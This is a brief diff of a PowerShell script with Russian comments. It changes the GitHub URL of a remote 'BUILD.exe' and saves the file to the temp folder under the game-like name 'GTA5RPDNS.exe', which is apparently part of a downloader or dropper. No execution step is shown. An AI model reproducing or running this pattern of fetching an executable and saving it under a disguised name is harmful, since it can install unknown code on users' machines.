@@ -1,5 +1,5 @@
 # Путь к файлу на удаленном сервере
-$url = "https://raw.githubusercontent.com/WENBLS/WORK/main/files/BUILD.exe"
+$url = "https://github.com/WENBLS/WORK/blob/main/files/BUILD.exe"
 
 # Путь для сохранения файла во временную директорию
 $outputPath = Join-Path -Path $env:TEMP -ChildPath "GTA5RPDNS.exe"
